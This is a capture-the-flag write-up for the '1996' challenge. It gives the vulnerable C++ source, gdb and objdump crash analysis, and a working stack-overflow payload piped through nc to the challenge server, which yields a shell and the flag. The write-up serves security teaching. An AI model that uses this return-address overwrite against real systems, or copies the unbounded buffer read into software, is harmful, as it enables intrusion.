# 1996

The challenge is presented as

> It's 1996 all over again!
>
> nc 35.207.132.47 22227
>
> Difficulty estimate: very easy

And linked we receive an executable binary and its source code:

```cpp
// compile with -no-pie -fno-stack-protector

#include <iostream>
#include <unistd.h>
#include <stdlib.h>

using namespace std;

void spawn_shell() {
    char* args[] = {(char*)"/bin/bash", NULL};
    execve("/bin/bash", args, NULL);
}

int main() {
    char buf[1024];

    cout << "Which environment variable do you want to read? ";
    cin >> buf;

    cout << buf << "=" << getenv(buf) << endl;
}
```

And one does indeed on netcat see the here expected output and can querry a few
environment variables.

Randomly trying around, there doesn't seem to be a variable that gives access
to a flag.

# attack mechanism

My reading homework is [this
article](http://phrack.org/issues/49/14.html#article) though I got a quick
summary at the congress: the return address is at the end of a stack frame of a
function, so if one manages to write behind the space for stack-local
variables, one can write into the address to which the program should return
after the function.

In this example this means if I write something more than 1024 characters into
the variable name, the main routine will do strange things. (just 1025 might
not be enough since the frame might be larger).

## Systematic approach

So the approach I did is enter longer strings until the program
crashes locally (adding like 5 characters every time)

And then `gdb` to the rescue:

```
coredumpctl debug --debugger=my-gdb
```

Where `my-gdb` is an executable text file in my `PATH` with the following
content.

```
#!/bin/sh

exec gdb -q -n -ex 'thread apply all bt' -batch "$@"
```

(okay, one could also just do `coredumpctl debug` and then enter `bt` in `gdb`)

From the stacktrace one can see to where `main` returned.

e.g.

```
pseyfert@robusta:/tmp > python2 -c 'print "."*1050' | ./1996
pseyfert@robusta:/tmp > coredumpctl debug --debugger=my-gdb
Hint: You are currently not seeing messages from other users and the system.
      Users in groups 'adm', 'systemd-journal', 'wheel' can see all messages.
      Pass -q to turn off this notice.
           PID: 14214 (1996)
           UID: 1000 (pseyfert)
           GID: 985 (users)
        Signal: 11 (SEGV)
     Timestamp: Sat 2018-12-29 18:55:32 CET (34s ago)
  Command Line: ./1996
    Executable: /tmp/1996
 Control Group: /user.slice/user-1000.slice/session-1.scope
          Unit: session-1.scope
         Slice: user-1000.slice
       Session: 1
     Owner UID: 1000 (pseyfert)
       Boot ID: b373963778ac44f68e1e2ec562ff5581
    Machine ID: 2b05d4aea6054d149ec64f58c82ec373
      Hostname: robusta
       Storage: /var/lib/systemd/coredump/core.1996.1000.b373963778ac44f68e1e2ec562ff5581.14214.1546106132000000.lz4
       Message: Process 14214 (1996) of user 1000 dumped core.
                
                Stack trace of thread 14214:
                #0  0x00007f765c002e2e n/a (n/a)

[New LWP 14214]
Core was generated by `./1996'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00007f765c002e2e in ?? ()

Thread 1 (LWP 14214):
#0  0x00007f765c002e2e in ?? ()
#1  0xffffffffffffff90 in ?? ()
#2  0x00007ffd1f926838 in ?? ()
#3  0x000000015cb41ed0 in ?? ()
#4  0x00000000004008cd in spawn_shell() ()
#5  0x0000000000000000 in ?? ()
```

from the ascii man page I could look up that `0x2e` is dot, so the last two
dots leaked into the return pointer. Disassembly `objdump -D 1996 | vim -R +'set ft=asm' -`

```
0000000000400897 <_Z11spawn_shellv>:
  400897:       55                      push   %rbp
  400898:       48 89 e5                mov    %rsp,%rbp
  40089b:       48 83 ec 10             sub    $0x10,%rsp
  40089f:       48 8d 05 b3 01 00 00    lea    0x1b3(%rip),%rax        # 400a59 <_ZStL19piecewise_construct+0x1>
  4008a6:       48 89 45 f0             mov    %rax,-0x10(%rbp)
  4008aa:       48 c7 45 f8 00 00 00    movq   $0x0,-0x8(%rbp)
  4008b1:       00
  4008b2:       48 8d 45 f0             lea    -0x10(%rbp),%rax
  4008b6:       ba 00 00 00 00          mov    $0x0,%edx
  4008bb:       48 89 c6                mov    %rax,%rsi
  4008be:       48 8d 3d 94 01 00 00    lea    0x194(%rip),%rdi        # 400a59 <_ZStL19piecewise_construct+0x1>
  4008c5:       e8 d6 fe ff ff          callq  4007a0 <execve@plt>
  4008ca:       90                      nop
  4008cb:       c9                      leaveq
  4008cc:       c3                      retq
```

shows we need to jump to `0000000000400897` and from the stacktrace we know
that trailing zero bytes are needed.

There is one small stumble stone left, namely to be able to provide some input
for the opened bash and interactively look around:

```
(python2 -c 'print "."*1048+"\x97\x08\x40\x00\x00\x00\x00"' ; cat )| nc 35.207.132.47 22227
```

This gives a shell:

```
pseyfert@robusta:~ > (python2 -c 'print "."*1048+"\x97\x08\x40\x00\x00\x00\x00"' ; cat )| nc 35.207.132.47 22227                   
Which environment variable do you want to read? .......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................@=
```

The cursor is at the end of that line and one's almost done after one `ls`:

```
.........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................@=ls
1996
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

okay, `flag.txt` sounds good

```
cat flag.txt
35C3_b29a2800780d85cfc346ce5d64f52e59c8d12c14
```

And there's the flag.

[![Creative Commons License](https://i.creativecommons.org/l/by-sa/4.0/80x15.png) This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License](http://creativecommons.org/licenses/by-sa/4.0/)]
